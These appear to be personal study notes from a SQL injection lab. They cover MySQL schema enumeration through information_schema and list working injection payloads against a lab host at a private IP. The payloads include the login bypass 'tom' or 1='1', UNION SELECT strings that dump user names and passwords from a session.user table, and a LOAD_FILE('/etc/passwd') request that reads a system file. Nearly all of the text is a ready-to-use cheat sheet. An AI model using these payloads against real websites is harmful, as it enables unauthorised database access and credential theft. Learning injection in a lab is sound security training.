```mysql
Mysql

database -> tables -> columns -> rows

Default 3 databases
mysql
information_schema
performance_schema

select id,name,pass from user;

select id,name,pass from vuln.username;

select 1,2,3 from database.table;


select table_schema,table_name,column_name from information_schema.columns

SELECT id FROM users WHERE name='tom' or 1='1' AND pass='tom' or 1='1';

http://10.208.50.61/

Username / password injection
interact with site correctly
tom' or 1='1 ( in username and password field)
WE TEST BOTH POST AND GET Methods

Blind injection method
How many columns are being shown to the screen?
php?item=1 or 1=1  ( test each item with true statement )
php?item=1 union select 1,2,3
php?item=1 union select table_schema,table_name,column_name from information_schema.columns

4 columns
Audi' or 1='1
Audi' union select 1,2,3,4,5#
Audi' union select 1,2,3,4,@@version#
Audi' union select id,2,name,pass,5 from session.user#


3 columns
http://10.208.50.61/uniondemo.php?Selection=1 or 1=1
http://10.208.50.61/uniondemo.php?Selection=2 union select 1,2,LOAD_FILE('/etc/passwd')
http://10.208.50.61/uniondemo.php?Selection=2 union select id,name,pass from session.user

```

